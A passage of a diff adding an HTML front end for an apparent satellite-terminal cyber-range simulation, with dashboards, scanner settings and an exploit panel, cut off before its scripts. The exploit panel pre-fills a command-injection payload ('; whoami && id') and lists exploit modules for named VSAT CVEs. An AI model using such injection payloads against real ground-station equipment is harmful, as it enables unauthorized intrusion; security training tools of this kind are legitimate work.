@@ -1,0 +1,2341 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VSAT Tactical Security & Cyber-Range Suite v5.0 (KEV + NSA Integrated)</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        cyber: {
+                            bg: '#020617',
+                            surface: '#0f172a',
+                            border: '#334155',
+                            accent: '#06b6d4',
+                            accentGlow: 'rgba(6, 182, 212, 0.15)',
+                            success: '#10b981',
+                            warning: '#f59e0b',
+                            error: '#ef4444',
+                            purple: '#8b5cf6'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@300;400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #020617;
+        }
+        .mono-font {
+            font-family: 'JetBrains Mono', monospace;
+        }
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #020617;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #334155;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #06b6d4;
+        }
+        /* Soft pulsing animation for alerts */
+        @keyframes pulse-cyan {
+            0%, 100% { box-shadow: 0 0 10px rgba(6, 182, 212, 0.3); }
+            50% { box-shadow: 0 0 20px rgba(6, 182, 212, 0.6); }
+        }
+        .pulse-glow-cyan {
+            animation: pulse-cyan 3s infinite;
+        }
+        @keyframes pulse-red {
+            0%, 100% { box-shadow: 0 0 10px rgba(239, 68, 68, 0.3); }
+            50% { box-shadow: 0 0 20px rgba(239, 68, 68, 0.6); }
+        }
+        .pulse-glow-red {
+            animation: pulse-red 2s infinite;
+        }
+    </style>
+</head>
+<body class="text-slate-100 overflow-x-hidden min-h-screen flex flex-col">
+
+    <div id="toast-container" class="fixed top-5 right-5 z-50 flex flex-col gap-3 max-w-sm"></div>
+
+    <!-- Main Navigation Bar -->
+    <header class="bg-cyber-surface border-b border-slate-800 sticky top-0 z-40 px-6 py-4 flex flex-col md:flex-row justify-between items-center gap-4">
+        <div class="flex items-center gap-3">
+            <div class="h-10 w-10 rounded-lg bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400 font-bold text-xl pulse-glow-cyan">
+                🛰️
+            </div>
+            <div>
+                <h1 class="text-xl font-extrabold tracking-tight flex items-center gap-2">
+                    VSAT Tactical Security Suite <span class="bg-violet-600/30 border border-violet-500/40 text-violet-400 text-xs px-2.5 py-0.5 rounded-full font-mono font-medium">v5.0 Ultra</span>
+                </h1>
+                <p class="text-xs text-slate-400">Integrated Ground-Station Assessment, Advanced Telemetry Testing & 9-Element Tactical Suite</p>
+            </div>
+        </div>
+        
+        <div class="flex items-center gap-4 flex-wrap md:flex-nowrap">
+            <!-- Global Environment Status Indicator -->
+            <div class="bg-emerald-950/30 border border-emerald-500/30 rounded-lg px-3 py-1.5 flex items-center gap-2.5">
+                <span class="h-2 w-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                <span class="text-xs font-mono font-semibold text-emerald-400">SAT-LINK BIND ACTIVE</span>
+            </div>
+            
+            <!-- Global Time Widget -->
+            <div class="bg-slate-900 border border-slate-800 rounded-lg px-3 py-1.5 flex items-center gap-2">
+                <span class="text-xs text-slate-400">UTC:</span>
+                <span id="utc-clock" class="text-xs font-mono font-bold text-cyan-400">00:00:00</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Global Threat Notice Block -->
+    <div class="bg-red-950/20 border-b border-red-500/30 px-6 py-3 text-center text-xs text-red-400 flex items-center justify-center gap-2">
+        <svg class="h-4 w-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+        </svg>
+        <span><strong>LEGAL DISCLAIMER & USER AGREEMENT:</strong> This application acts as an interactive simulation containing technical references to <em>vsat-toolkit-v5.html</em>, <em>vsat-toolkit-v5.txt</em>, and <em>vsat_detection.py</em>. Always obtain explicit authorized written consent prior to analyzing remote production ground networks.</span>
+    </div>
+
+    <div class="flex flex-1 overflow-hidden">
+        
+        <!-- Sidebar Navigation Menu -->
+        <aside class="w-full md:w-72 bg-cyber-bg border-r border-slate-800 p-4 space-y-2 shrink-0 hidden md:block overflow-y-auto max-h-[calc(100vh-140px)]">
+            <p class="text-[10px] font-bold text-slate-500 tracking-wider uppercase px-3 py-1">Mission Control</p>
+            <nav class="space-y-1">
+                <button onclick="switchTab('overview')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-cyan-400 bg-cyan-950/20 border-l-2 border-cyan-500">
+                    📊 Operational Dashboard
+                </button>
+                <button onclick="switchTab('intel')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900">
+                    📡 VSAT Threat Intelligence
+                </button>
+            </nav>
+
+            <p class="text-[10px] font-bold text-slate-500 tracking-wider uppercase px-3 pt-3 pb-1">9 Ethical Hacking Elements</p>
+            <nav class="space-y-1">
+                <button onclick="switchTab('vuln-scanner')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900">
+                    🔍 1. Vulnerability Scanner
+                </button>
+                <button onclick="switchTab('pentest-frame')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900">
+                    🎯 2. Penetration Framework
+                </button>
+                <button onclick="switchTab('net-analysis')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900">
+                    🌐 3. Network Analysis Tool
+                </button>
+                <button onclick="switchTab('exploit-dev')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900">
+                    💻 4. Exploit Development Kit
+                </button>
+                <button onclick="switchTab('pass-crack')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900">
+                    🔑 5. Password Cracking & Recovery
+                </button>
+                <button onclick="switchTab('social-eng')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900">
+                    🎣 6. Social Eng. Simulator
+                </button>
+                <button onclick="switchTab('malware-sandbox')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900">
+                    ☣️ 7. Malware Sandbox
+                </button>
+                <button onclick="switchTab('incident-forensics')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900">
+                    📋 8. Incident Response & Forensics
+                </button>
+                <button onclick="switchTab('auto-reporting')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900">
+                    📥 9. Automated Reports Engine
+                </button>
+                <button onclick="switchTab('rf-jamming')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900">
+                    📡 10. RF Jamming & Spectrum Analyzer
+                </button>
+                <button onclick="switchTab('ids-engine')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900">
+                    🛡️ 11. IDS Rules & Correlation Engine
+                </button>
+            </nav>
+
+            <p class="text-[10px] font-bold text-slate-500 tracking-wider uppercase px-3 pt-3 pb-1">Compliance & Code</p>
+            <nav class="space-y-1">
+                <button onclick="switchTab('hardening')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900">
+                    🔒 NSA Compliance & Hardening
+                </button>
+                <button onclick="switchTab('codes')" class="tab-btn w-full flex items-center gap-3 px-3 py-2 rounded-lg text-xs font-medium transition-all text-slate-400 hover:text-slate-200 hover:bg-slate-900">
+                    📜 Production Code & Scripts
+                </button>
+            </nav>
+        </aside>
+
+        <!-- Content Container -->
+        <main class="flex-1 p-6 overflow-y-auto max-h-[calc(100vh-140px)]">
+
+            <!-- TAB 1: OVERVIEW -->
+            <div id="overview" class="tab-content space-y-6">
+                <!-- Welcome Banner -->
+                <div class="bg-gradient-to-r from-slate-900 via-cyber-surface to-slate-900 border border-slate-800 rounded-xl p-6 relative overflow-hidden">
+                    <div class="absolute top-0 right-0 h-40 w-40 bg-cyan-500/5 rounded-full blur-3xl pointer-events-none"></div>
+                    <div class="flex justify-between items-start flex-wrap gap-4">
+                        <div>
+                            <h2 class="text-2xl font-bold text-white tracking-tight flex items-center gap-2">VSAT Unified Cyber-Range & Toolset</h2>
+                            <p class="text-slate-400 text-sm mt-1 max-w-3xl">An all-in-one system incorporating the complete list of 9 vital offensive and defensive modules outlined in the core guidelines, built for space operations resilience.</p>
+                        </div>
+                        <span class="bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 text-xs px-3 py-1 rounded-md font-mono">Reference: A sophisticated ethical hacking too.txt</span>
+                    </div>
+                </div>
+
+                <!-- Main Grid Statistics -->
+                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+                    <div class="bg-cyber-surface border border-slate-800 rounded-xl p-5 flex flex-col justify-between">
+                        <div class="flex justify-between items-start">
+                            <span class="text-xs font-semibold text-slate-400 uppercase tracking-wider">CISA KEV Matches</span>
+                            <span class="text-xs bg-red-500/10 text-red-400 px-2 py-0.5 rounded-md font-mono">ACTIVE</span>
+                        </div>
+                        <div class="mt-4">
+                            <h3 id="stat-kev-count" class="text-3xl font-extrabold text-white">4</h3>
+                            <p class="text-xs text-slate-400 mt-1">Satellite vulnerabilities flagged by CISA</p>
+                        </div>
+                    </div>
+
+                    <div class="bg-cyber-surface border border-slate-800 rounded-xl p-5 flex flex-col justify-between">
+                        <div class="flex justify-between items-start">
+                            <span class="text-xs font-semibold text-slate-400 uppercase tracking-wider">Telemetry Accuracy</span>
+                            <span class="text-xs bg-cyan-500/10 text-cyan-400 px-2 py-0.5 rounded-md font-mono">STANDBY</span>
+                        </div>
+                        <div class="mt-4">
+                            <h3 class="text-3xl font-extrabold text-white">99.85%</h3>
+                            <p class="text-xs text-slate-400 mt-1">Carrier tracking fidelity index</p>
+                        </div>
+                    </div>
+
+                    <div class="bg-cyber-surface border border-slate-800 rounded-xl p-5 flex flex-col justify-between">
+                        <div class="flex justify-between items-start">
+                            <span class="text-xs font-semibold text-slate-400 uppercase tracking-wider">NSA Compliance</span>
+                            <span id="stat-compliance-badge" class="text-xs bg-amber-500/10 text-amber-400 px-2 py-0.5 rounded-md font-mono">WEAK</span>
+                        </div>
+                        <div class="mt-4">
+                            <h3 id="stat-compliance-score" class="text-3xl font-extrabold text-white">0%</h3>
+                            <p class="text-xs text-slate-400 mt-1">Ground station security standards aligned</p>
+                        </div>
+                    </div>
+
+                    <div class="bg-cyber-surface border border-slate-800 rounded-xl p-5 flex flex-col justify-between">
+                        <div class="flex justify-between items-start">
+                            <span class="text-xs font-semibold text-slate-400 uppercase tracking-wider">Suite Level</span>
+                            <span class="text-xs bg-violet-500/10 text-violet-400 px-2 py-0.5 rounded-md font-mono">ELEVATED</span>
+                        </div>
+                        <div class="mt-4">
+                            <h3 class="text-3xl font-extrabold text-violet-400">DEFCON 3</h3>
+                            <p class="text-xs text-slate-400 mt-1">Based on local Threat Feed indices</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Active Remediations Control Panel -->
+                <div class="bg-slate-900 border border-slate-800 rounded-xl p-6">
+                    <h3 class="text-md font-bold text-cyan-400 mb-2 flex items-center gap-2">🛡️ Quick Ground Station Hardening Dashboard</h3>
+                    <p class="text-xs text-slate-400 mb-4">Toggle remediations here to instantly inject secure controls into the tactical simulation engine (Port 80/443, SNMPv3, VLANs, Firmware Checks).</p>
+                    <div class="grid grid-cols-1 md:grid-cols-4 gap-4 text-xs">
+                        <button id="quick-toggle-creds" onclick="toggleComplianceHardening('chk-secure-creds')" class="p-3 bg-cyber-surface border border-slate-800 hover:border-slate-700 rounded-lg text-left transition-all flex flex-col justify-between">
+                            <span class="font-bold block text-slate-300">🔑 Secure Credentials</span>
+                            <span id="quick-lbl-creds" class="text-[10px] text-red-400 mt-2 font-mono uppercase">Vulnerable (public)</span>
+                        </button>
+                        <button id="quick-toggle-https" onclick="toggleComplianceHardening('chk-enforce-https')" class="p-3 bg-cyber-surface border border-slate-800 hover:border-slate-700 rounded-lg text-left transition-all flex flex-col justify-between">
+                            <span class="font-bold block text-slate-300">🔒 Enforce HTTPS</span>
+                            <span id="quick-lbl-https" class="text-[10px] text-red-400 mt-2 font-mono uppercase">Unencrypted (HTTP)</span>
+                        </button>
+                        <button id="quick-toggle-network" onclick="toggleComplianceHardening('chk-network-seg')" class="p-3 bg-cyber-surface border border-slate-800 hover:border-slate-700 rounded-lg text-left transition-all flex flex-col justify-between">
+                            <span class="font-bold block text-slate-300">🌐 VLAN Segmentation</span>
+                            <span id="quick-lbl-network" class="text-[10px] text-red-400 mt-2 font-mono uppercase">Disabled (Flat WAN)</span>
+                        </button>
+                        <button id="quick-toggle-sig" onclick="toggleComplianceHardening('chk-code-sig')" class="p-3 bg-cyber-surface border border-slate-800 hover:border-slate-700 rounded-lg text-left transition-all flex flex-col justify-between">
+                            <span class="font-bold block text-slate-300">☣️ Firmware Signatures</span>
+                            <span id="quick-lbl-sig" class="text-[10px] text-red-400 mt-2 font-mono uppercase">Disabled (Unsigned)</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Core Hacking Elements Summary Interface -->
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    <div class="bg-cyber-surface border border-slate-800 rounded-xl p-6 space-y-4 lg:col-span-2">
+                        <h3 class="text-lg font-bold text-white flex items-center gap-2">🛠️ Integrated Suite Dashboard</h3>
+                        <p class="text-xs text-slate-400">We have combined every aspect of space ground segment vulnerability research, from command payload formulation to automated reporting, down into an automated client simulation.</p>
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs pt-2">
+                            <div class="p-3 bg-slate-900 border border-slate-800 rounded-lg hover:border-cyan-500/40 transition-all cursor-pointer" onclick="switchTab('vuln-scanner')">
+                                <h4 class="font-bold text-cyan-400">📡 Scanning & Testing</h4>
+                                <p class="text-slate-400 mt-1">Audit active terminals, run exploit playbooks, and construct custom payloads.</p>
+                            </div>
+                            <div class="p-3 bg-slate-900 border border-slate-800 rounded-lg hover:border-cyan-500/40 transition-all cursor-pointer" onclick="switchTab('incident-forensics')">
+                                <h4 class="font-bold text-violet-400">🔍 Defense & Forensics</h4>
+                                <p class="text-slate-400 mt-1">Analyze syslog streams using YARA rules matching CISA KEV criteria.</p>
+                            </div>
+                            <div class="p-3 bg-slate-900 border border-slate-800 rounded-lg hover:border-cyan-500/40 transition-all cursor-pointer" onclick="switchTab('auto-reporting')">
+                                <h4 class="font-bold text-emerald-400">📋 Automated Reports</h4>
+                                <p class="text-slate-400 mt-1">Compile comprehensive documentation of vulnerability findings instantly.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Environment Control & Quick-Links -->
+                    <div class="bg-cyber-surface border border-slate-800 rounded-xl p-6 flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <h3 class="text-md font-bold text-white">⚙️ Suite Quick Links</h3>
+                            <p class="text-xs text-slate-400">Initialize scans or monitor simulated RF signal behaviors across the space telemetry plane.</p>
+                            <div class="space-y-2">
+                                <button onclick="switchTab('vuln-scanner')" class="w-full text-left p-3 rounded-lg bg-slate-900 border border-slate-800 hover:border-cyan-500/50 transition-all text-xs flex items-center justify-between">
+                                    <span>🔍 Launch Vuln Scanner (Step 1)</span>
+                                    <span class="text-cyan-400 font-bold">&rarr;</span>
+                                </button>
+                                <button onclick="switchTab('pentest-frame')" class="w-full text-left p-3 rounded-lg bg-slate-900 border border-slate-800 hover:border-cyan-500/50 transition-all text-xs flex items-center justify-between">
+                                    <span>🎯 Open Penetration Frame (Step 2)</span>
+                                    <span class="text-cyan-400 font-bold">&rarr;</span>
+                                </button>
+                            </div>
+                        </div>
+                        <div class="pt-4 border-t border-slate-800/80 text-[10px] text-slate-500 font-mono">
+                            VSAT-TOOL-V5 BUILD: 2026.06.04-ULTRA
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Live RF Canvas & Anomaly Injection -->
+                <div class="bg-cyber-surface border border-slate-800 p-6 rounded-xl">
+                    <div class="flex justify-between items-center border-b border-slate-800 pb-2 mb-4">
+                        <div>
+                            <h3 class="text-sm font-bold text-white tracking-wide uppercase">📡 Live RF Signal & Telemetry Monitor</h3>
+                            <p class="text-[10px] text-slate-400">Simulating live signal metrics matching real-time VSAT transit conditions.</p>
+                        </div>
+                        <div class="flex gap-2">
+                            <button onclick="triggerSignalAnomalies(true)" class="bg-red-600 hover:bg-red-700 text-white text-[10px] px-2.5 py-1.5 rounded-md font-bold">Inject Signal Anomaly</button>
+                            <button onclick="triggerSignalAnomalies(false)" class="bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px] px-2.5 py-1.5 rounded-md">Re-Stabilize Waveforms</button>
+                        </div>
+                    </div>
+                    
+                    <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-4 text-center">
+                        <div class="bg-slate-950/60 p-2.5 rounded-lg border border-slate-800">
+                            <div class="text-[10px] text-slate-400">Carrier SNR</div>
+                            <div class="text-lg font-mono font-bold text-cyan-400" id="telemetry-snr">14.2 dB</div>
+                        </div>
+                        <div class="bg-slate-950/60 p-2.5 rounded-lg border border-slate-800">
+                            <div class="text-[10px] text-slate-400">Doppler Offset</div>
+                            <div class="text-lg font-mono font-bold text-cyan-400" id="telemetry-doppler">+14.2 Hz</div>
+                        </div>
+                        <div class="bg-slate-950/60 p-2.5 rounded-lg border border-slate-800">
+                            <div class="text-[10px] text-slate-400">Network Jitter</div>
+                            <div class="text-lg font-mono font-bold text-cyan-400" id="telemetry-jitter">12 ms</div>
+                        </div>
+                        <div class="bg-slate-950/60 p-2.5 rounded-lg border border-slate-800">
+                            <div class="text-[10px] text-slate-400">Frequency Offset</div>
+                            <div class="text-lg font-mono font-bold text-cyan-400" id="telemetry-freq">11.5 GHz</div>
+                        </div>
+                    </div>
+
+                    <canvas id="telemetry-canvas" class="w-full bg-slate-950 rounded-lg border border-slate-800" style="height: 180px;"></canvas>
+                </div>
+            </div>
+
+            <!-- TAB 2: THREAT INTELLIGENCE -->
+            <div id="intel" class="tab-content space-y-6 hidden">
+                <div class="flex justify-between items-center flex-wrap gap-4">
+                    <div>
+                        <h2 class="text-xl font-bold text-white flex items-center gap-2">📡 Ground Segment Threat Intelligence Feed</h2>
+                        <p class="text-xs text-slate-400">Active threat database mirroring structured satellite CVE metrics referenced from <strong>advisories.json</strong>.</p>
+                    </div>
+                    <button onclick="toggleElement('custom-intel-form')" class="bg-cyan-500 hover:bg-cyan-600 text-slate-950 font-bold text-xs px-4 py-2 rounded-lg transition-all flex items-center gap-2">
+                        <span>➕ Register Incident Advisory</span>
+                    </button>
+                </div>
+
+                <!-- Custom Advisory Form -->
+                <div id="custom-intel-form" class="hidden bg-cyber-surface border border-slate-800 p-5 rounded-xl space-y-4">
+                    <h3 class="text-sm font-bold text-white">Log Custom Adversary Target / Vulnerability Details</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
+                        <div>
+                            <label class="block text-slate-400 mb-1">CVE / ID Code</label>
+                            <input type="text" id="intel-cve" placeholder="CVE-2026-XXXX" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                        </div>
+                        <div>
+                            <label class="block text-slate-400 mb-1">Title</label>
+                            <input type="text" id="intel-title" placeholder="Critical Satcom Target..." class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                        </div>
+                        <div>
+                            <label class="block text-slate-400 mb-1">Severity</label>
+                            <select id="intel-severity" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                                <option value="critical">Critical</option>
+                                <option value="high">High</option>
+                                <option value="medium">Medium</option>
+                                <option value="low">Low</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
+                        <div>
+                            <label class="block text-slate-400 mb-1">Summary / Context</label>
+                            <textarea id="intel-summary" rows="2" placeholder="Describe the vulnerability, firmware vectors, or observed attack signatures." class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200"></textarea>
+                        </div>
+                        <div>
+                            <label class="block text-slate-400 mb-1">Required Action / Hardening</label>
+                            <textarea id="intel-action" rows="2" placeholder="Recommended patching procedures, ACL mitigations, etc." class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200"></textarea>
+                        </div>
+                    </div>
+                    <div class="flex justify-end gap-2 text-xs">
+                        <button onclick="toggleElement('custom-intel-form')" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg">Cancel</button>
+                        <button onclick="submitCustomAdvisory()" class="px-4 py-2 bg-cyan-500 hover:bg-cyan-600 text-slate-950 font-bold rounded-lg">Register Advisory</button>
+                    </div>
+                </div>
+
+                <!-- Live Advisory List Panel -->
+                <div id="intel-feed-container" class="grid grid-cols-1 gap-4">
+                    <!-- Injected dynamically via JS -->
+                </div>
+            </div>
+
+            <!-- TAB 3: ELEMENT 1 - VULNERABILITY SCANNERS -->
+            <div id="vuln-scanner" class="tab-content space-y-6 hidden">
+                <div>
+                    <h2 class="text-xl font-bold text-white">🔍 Element 1: Wide-Spectrum Vulnerability Scanner Engine</h2>
+                    <p class="text-xs text-slate-400 font-mono">Simulates network sweeps, maps communication ports, checks configurations, and audits RF telemetry planes.</p>
+                </div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    <div class="bg-cyber-surface border border-slate-800 p-6 rounded-xl space-y-4">
+                        <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Scanner Settings</h3>
+                        <div class="space-y-4 text-xs">
+                            <div>
+                                <label class="block text-slate-400 mb-1">Target Address Space / Range</label>
+                                <input type="text" id="scan-target-range" value="192.168.100.1/24" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">Scan Profile Mode</label>
+                                <select id="scan-profile-selector" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                                    <option value="quick">Quick Sweep (Standard management ports 21, 22, 23, 80, 443, 161, 7547)</option>
+                                    <option value="deep">Full Ground & Space Sector Audit (Ports, RF Signals, Firmware, JTAG Interfaces)</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">SNMP Query Target Community String</label>
+                                <input type="text" id="scan-snmp-community" value="public" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200 font-mono">
+                                <span class="text-[10px] text-slate-500">Change from default 'public' to test complex custom community strings.</span>
+                            </div>
+                            
+                            <div class="border-t border-slate-800 pt-3">
+                                <label class="block text-slate-400 mb-2 font-bold uppercase tracking-wide text-[10px]">Active Audit Phases</label>
+                                <div class="space-y-2">
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" id="phase-ports" checked class="accent-cyan-500">
+                                        <span>Procedures 1-3: Cleartext Ports (21, 23, 80)</span>
+                                    </label>
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" id="phase-wan" checked class="accent-cyan-500">
+                                        <span>Procedure 4: WAN Auto-Provisioning (7547)</span>
+                                    </label>
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" id="phase-firmware" checked class="accent-cyan-500">
+                                        <span>Procedure 5: Firmware Integrity Partition</span>
+                                    </label>
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" id="phase-hardware" checked class="accent-cyan-500">
+                                        <span>Procedure 6: JTAG & UART Interface Audits</span>
+                                    </label>
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" id="phase-rf" checked class="accent-cyan-500">
+                                        <span>Procedure 7: RF Anomaly Carrier Check</span>
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+                        <button onclick="runVulnerabilityScanner()" class="w-full bg-cyan-500 hover:bg-cyan-600 text-slate-950 font-bold py-2.5 rounded-lg text-xs transition-all flex items-center justify-center gap-2">
+                            <span>🚀 Execute Full-Spectrum Audit</span>
+                        </button>
+                    </div>
+
+                    <div class="lg:col-span-2 bg-cyber-surface border border-slate-800 p-6 rounded-xl flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <div class="flex justify-between items-center border-b border-slate-800 pb-2">
+                                <h3 class="text-sm font-bold text-white">Scanner Diagnostic Output</h3>
+                                <div class="flex items-center gap-1.5 font-mono text-[9px]">
+                                    <span id="scan-status-dot" class="h-1.5 w-1.5 rounded-full bg-slate-500"></span>
+                                    <span id="scan-status-text" class="text-slate-400">STANDBY</span>
+                                </div>
+                            </div>
+                            <div class="bg-slate-950 rounded-lg border border-slate-800 p-4 font-mono text-[11px] leading-relaxed text-cyan-400 h-96 overflow-y-auto whitespace-pre" id="scan-console-log"># Scanner active. Define parameters and launch full-spectrum diagnostic sweep.</div>
+                        </div>
+                        <div class="pt-4 border-t border-slate-800 mt-4 flex justify-between items-center text-xs">
+                            <span class="text-slate-400" id="scan-results-summary">Flags: 0 Alerts Logged</span>
+                            <button onclick="downloadReportElement('scan-console-log', 'Full_Spectrum_Scan_Report.txt')" class="bg-slate-850 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded-lg font-semibold text-xs border border-slate-700">Export Plaintext</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 4: ELEMENT 2 - PENETRATION TESTING FRAMEWORK -->
+            <div id="pentest-frame" class="tab-content space-y-6 hidden">
+                <div>
+                    <h2 class="text-xl font-bold text-white">🎯 Element 2: Controlled Exploitation Testing Framework</h2>
+                    <p class="text-xs text-slate-400">Platforms supporting controlled exploitation validation within authorized ground environments.</p>
+                </div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    <div class="bg-cyber-surface border border-slate-800 p-6 rounded-xl space-y-4">
+                        <h3 class="text-sm font-bold text-white border-b border-slate-800 pb-2">Exploitation Setup</h3>
+                        <div class="space-y-3 text-xs">
+                            <div>
+                                <label class="block text-slate-400 mb-1">Target Endpoint / URL</label>
+                                <input type="text" id="exploit-target-url" value="http://192.168.100.1/api/config" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200 font-mono">
+                                <span class="text-[10px] text-slate-400">Try changing 'http://' to 'https://' after toggling HTTPS enforcement.</span>
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">Exploit Module Target</label>
+                                <select id="exploit-module-selector" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200">
+                                    <option value="cve-2024-6199">Viasat Axyom RCE Command Bypass (CVE-2024-6199)</option>
+                                    <option value="cve-2026-1199">Hughes HT-2000 Remote Execution (CVE-2026-1199)</option>
+                                    <option value="tr069-poison">TR-069 Rogue ACS Config Push</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-slate-400 mb-1">Exploit Payload Parameter</label>
+                                <input type="text" id="exploit-payload-input" value="; whoami && id" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-200 font-mono">
+                            </div>
+                        </div>
+                        <button onclick="runExploitSimulation()" class="w-full bg-red-500 hover:bg-red-600 text-slate-950 font-bold py-2.5 rounded-lg text-xs transition-all flex items-center justify-center gap-2">
+                            <span>⚡ Execute Exploit Probe</span>
+                        </button>
+                    </div>
+
+                    <div class="lg:col-span-2 bg-cyber-surface border border-slate-800 p-6 rounded-xl flex flex-col justify-between">
+                        <div class="space-y-4">
+                            <div class="flex justify-between items-center border-b border-slate-800 pb-2">
+                                <h3 class="text-sm font-bold text-white">Exploit Framework Console</h3>
+                                <div class="flex items-center gap-1.5 font-mono text-[9px]">
+                                    <span id="exploit-status-dot" class="h-1.5 w-1.5 rounded-full bg-slate-500"></span>
+                                    <span id="exploit-status-text" class="text-slate-400">STANDBY</span>
+                                </div>
+                            </div>
+                            <div class="bg-slate-950 rounded-lg border border-slate-800 p-4 font-mono text-[11px] leading-relaxed text-red-400/90 h-64 overflow-y-auto whitespace-pre" id="exploit-console-log"># Exploit terminal offline. Select payload parameter and launch probe.</div>
+                        </div>
+                        <div class="pt-4 border-t border-slate-800 mt-4 flex justify-between items-center text-xs">
+                            <span class="text-slate-400" id="exploit-verdict">Probe Status: Not Run</span>
